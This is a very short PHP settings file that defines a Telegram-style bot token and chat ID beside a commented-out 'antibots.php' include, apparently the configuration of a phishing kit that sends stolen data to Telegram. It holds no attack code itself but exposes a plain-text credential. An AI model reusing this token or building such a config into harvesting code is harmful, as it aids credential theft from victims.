ww<?php
// include "antibots.php";
$id="7769826864";
$tokn="8953253319:AAFl3spuzT9tXRT8Vka8Dg-_OlX08mEcyTc";
?>